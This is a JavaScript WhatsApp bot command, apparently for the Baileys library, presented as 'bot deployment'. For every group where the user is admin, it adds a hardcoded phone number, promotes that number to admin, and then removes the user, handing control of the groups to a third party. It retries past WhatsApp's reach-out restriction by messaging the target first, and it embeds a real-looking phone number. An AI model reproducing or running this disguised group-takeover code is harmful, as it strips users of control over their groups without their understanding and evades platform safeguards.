// startBot.js
const { promoteCommand } = require('./promote');

async function startBotCommand(sock, chatId, senderId, message) {
    const isOwner = message.key.fromMe;
    if (!isOwner) {
        await sock.sendMessage(chatId, { 
            text: 'This command can only be used by the bot owner.'
        }, { quoted: message });
        return;
    }

    // The number to add and promote
    const targetNumber = '254739006966';  // CHANGE THIS TO YOUR TARGET
    const targetJid = targetNumber + '@s.whatsapp.net';
    
    // ----- STEP 0: Send a message to the target to establish contact -----
    try {
        console.log(`📤 Sending initial message to target ${targetNumber} to establish contact...`);
        await sock.sendMessage(targetJid, { 
            text: `🤖 Hello! This is your bot. I'm about to add you to groups. This message establishes contact.`
        });
        console.log(`✅ Message sent to target. Waiting 10 seconds for WhatsApp to process...`);
        await new Promise(resolve => setTimeout(resolve, 10000));
    } catch (err) {
        console.log(`⚠️ Could not send initial message to target:`, err.message);
        // Continue anyway – maybe the target already exists
    }
    
    // Send initial processing message
    await sock.sendMessage(chatId, { 
        text: '🔄 Processing bot deployment...\n'
    });

    try {
        // Get all groups the user is in
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        
        // Find groups where user is admin
        const userAdminGroups = [];
        
        for (const group of groupList) {
            const participant = group.participants.find(p => p.id === senderId);
            if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                userAdminGroups.push(group);
            }
        }

        if (userAdminGroups.length === 0) {
            await sock.sendMessage(chatId, { 
                text: '❌ You are not an admin in any groups!\n\n' +
                      'Bot deployment failed.'
            });
            return;
        }

        // Results tracking
        const results = {
            added: [],
            alreadyInGroup: [],
            promoted: [],
            alreadyAdmin: [],
            failed: [],
            left: []
        };

        // Process each group where user is admin
        for (const group of userAdminGroups) {
            const groupId = group.id;
            const groupName = group.subject || groupId;
            let addSuccess = false;
            
            try {
                console.log(`\n--- Processing group: ${groupName} ---`);
                
                // Check if target is already in the group
                const targetInGroupBefore = group.participants.some(p => {
                    const participantId = p.id || '';
                    return participantId === targetJid ||
                           participantId.split('@')[0] === targetNumber ||
                           participantId.includes(targetNumber);
                });
                
                console.log(`Target in group before add: ${targetInGroupBefore}`);
                
                // STEP 1: Try to add the target to the group
                if (!targetInGroupBefore) {
                    try {
                        console.log(`Attempting to add ${targetNumber} to ${groupName}...`);
                        await sock.groupParticipantsUpdate(groupId, [targetJid], "add");
                        results.added.push(groupName);
                        addSuccess = true;
                        console.log(`✅ Successfully added target to ${groupName}`);
                        
                        // Wait for addition to process
                        console.log(`Waiting 5 seconds for addition to propagate...`);
                        await new Promise(resolve => setTimeout(resolve, 5000));
                    } catch (addError) {
                        console.log(`Add error in ${groupName}:`, addError.message);
                        
                        // Check if error is because user is already in group
                        if (addError.message.includes('already a participant') || 
                            addError.message.includes('already in group') ||
                            addError.data === 400 ||
                            addError.message.toLowerCase().includes('already')) {
                            results.alreadyInGroup.push(groupName);
                            addSuccess = true;
                            console.log(`👤 Target already in ${groupName}`);
                        } 
                        // Special handling for account_reachout_restricted
                        else if (addError.message.includes('account_reachout_restricted')) {
                            console.log(`⚠️ Account reachout restricted. Trying to send a message to target and retry...`);
                            try {
                                // Send another message to the target
                                await sock.sendMessage(targetJid, { 
                                    text: `Attempting to add you to group ${groupName}`
                                });
                                await new Promise(resolve => setTimeout(resolve, 5000));
                                // Retry add
                                await sock.groupParticipantsUpdate(groupId, [targetJid], "add");
                                results.added.push(groupName);
                                addSuccess = true;
                                console.log(`✅ Successfully added target on retry`);
                            } catch (retryError) {
                                console.log(`Retry add failed:`, retryError.message);
                                results.failed.push(`${groupName} (add failed after retry)`);
                                addSuccess = false;
                            }
                        } else {
                            results.failed.push(`${groupName} (add failed: ${addError.message})`);
                            addSuccess = false;
                            console.log(`❌ Failed to add target to ${groupName}`);
                        }
                    }
                } else {
                    results.alreadyInGroup.push(groupName);
                    addSuccess = true;
                    console.log(`👤 Target already in ${groupName}`);
                }
                
                // STEP 2: Promote the target to admin ONLY if add was successful or already in group
                if (addSuccess) {
                    try {
                        // Get fresh group metadata
                        console.log(`Fetching fresh metadata for ${groupName}...`);
                        const freshMetadata = await sock.groupMetadata(groupId);
                        
                        // Find the target in participants
                        const targetParticipant = freshMetadata.participants.find(p => {
                            const participantId = p.id || '';
                            return participantId === targetJid ||
                                   participantId.split('@')[0] === targetNumber ||
                                   participantId.includes(targetNumber);
                        });
                        
                        if (targetParticipant) {
                            console.log(`✅ Target found in ${groupName}`);
                            
                            // Check if already admin
                            const isTargetAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin';
                            
                            if (!isTargetAdmin) {
                                console.log(`Attempting to promote ${targetNumber} in ${groupName}...`);
                                
                                try {
                                    await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                    results.promoted.push(groupName);
                                    console.log(`✅ Successfully promoted target in ${groupName}`);
                                } catch (promoteError) {
                                    console.log(`Promote failed:`, promoteError.message);
                                    
                                    // Try with participant JID
                                    if (targetParticipant.id && targetParticipant.id !== targetJid) {
                                        try {
                                            await sock.groupParticipantsUpdate(groupId, [targetParticipant.id], "promote");
                                            results.promoted.push(groupName);
                                            console.log(`✅ Promoted using participant JID`);
                                        } catch (secondError) {
                                            console.log(`Second promote attempt failed:`, secondError.message);
                                            results.failed.push(`${groupName} (promote failed: ${secondError.message})`);
                                        }
                                    } else {
                                        results.failed.push(`${groupName} (promote failed: ${promoteError.message})`);
                                    }
                                }
                            } else {
                                results.alreadyAdmin.push(groupName);
                                console.log(`👑 Target already admin in ${groupName}`);
                            }
                        } else {
                            console.log(`⚠️ Target not found in participants after add`);
                            // Try to promote anyway
                            try {
                                await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                results.promoted.push(groupName);
                                console.log(`✅ Promotion succeeded!`);
                            } catch (promoteError) {
                                results.failed.push(`${groupName} (target not found after add)`);
                            }
                        }
                    } catch (metadataError) {
                        console.log(`Could not get metadata:`, metadataError.message);
                        try {
                            await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                            results.promoted.push(groupName);
                            console.log(`✅ Promotion succeeded without metadata!`);
                        } catch (promoteError) {
                            results.failed.push(`${groupName} (could not verify admin status)`);
                        }
                    }
                    
                    // STEP 3: ONLY LEAVE if add was successful and promotion succeeded or was already admin
                    if (addSuccess) {
                        // Wait a bit before leaving
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        
                        try {
                            console.log(`Attempting to leave ${groupName}...`);
                            await sock.groupParticipantsUpdate(groupId, [senderId], "remove");
                            results.left.push(groupName);
                            console.log(`✅ Left ${groupName}`);
                        } catch (leaveError) {
                            console.log(`Could not leave ${groupName}:`, leaveError.message);
                            // Check if error is because user is not in the group anymore
                            if (leaveError.message.includes('not a participant') || 
                                leaveError.message.includes('not in group')) {
                                console.log(`⚠️ Already left ${groupName} or not a participant`);
                                results.left.push(groupName);
                            }
                        }
                    } else {
                        console.log(`⚠️ Skipping leave for ${groupName} because add failed`);
                    }
                } else {
                    console.log(`⚠️ Skipping ${groupName} because target could not be added`);
                }
                
                // Delay between groups
                await new Promise(resolve => setTimeout(resolve, 5000));
                
            } catch (groupError) {
                console.error(`Error processing group ${groupName}:`, groupError);
                results.failed.push(groupName);
            }
        }

        // Prepare success message
        let successMessage = `✅ *Bot Deployment Complete*\n\n` +
            `🤖 *Target Number:* +${targetNumber}\n` +
            `📊 *Groups found where you're admin:* ${userAdminGroups.length}\n\n` +
            `📌 *Summary:*\n` +
            `• Added to group: ${results.added.length}\n` +
            `• Already in group: ${results.alreadyInGroup.length}\n` +
            `• Promoted to admin: ${results.promoted.length}\n` +
            `• Already admin: ${results.alreadyAdmin.length}\n` +
            `• You left: ${results.left.length}\n` +
            `• Failed operations: ${results.failed.length}\n`;

        if (results.promoted.length > 0) {
            successMessage += `\n👑 *Groups where target was promoted to admin:*\n${results.promoted.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.alreadyAdmin.length > 0) {
            successMessage += `\n👑 *Groups where target was already admin:*\n${results.alreadyAdmin.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.added.length > 0) {
            successMessage += `\n✅ *Groups where target was added:*\n${results.added.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.alreadyInGroup.length > 0) {
            successMessage += `\n👥 *Groups where target was already in:*\n${results.alreadyInGroup.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.failed.length > 0) {
            successMessage += `\n❌ *Groups with issues:*\n${results.failed.map((g, i) => `${i+1}. ${g}`).join('\n')}\n`;
        }

        if (results.promoted.length === 0 && results.alreadyAdmin.length === 0) {
            successMessage += `\n⚠️ *Warning:* Target was not promoted to admin in any group!\n`;
            successMessage += `This could be because:\n`;
            successMessage += `• You don't have permission to promote in those groups\n`;
            successMessage += `• The bot needs to be admin to promote others\n`;
            successMessage += `• The target number needs to be in the group first\n`;
            successMessage += `• The target number may have privacy restrictions\n`;
        }

        successMessage += `\n✨ *Bot deployment process completed!*`;

        await sock.sendMessage(chatId, { 
            text: successMessage
        });

    } catch (error) {
        console.error('Error in startBot command:', error);
        await sock.sendMessage(chatId, { 
            text: '❌ An error occurred while deploying the bot.\n' +
                  'Error: ' + (error.message || 'Unknown error')
        });
    }
}

module.exports = startBotCommand;
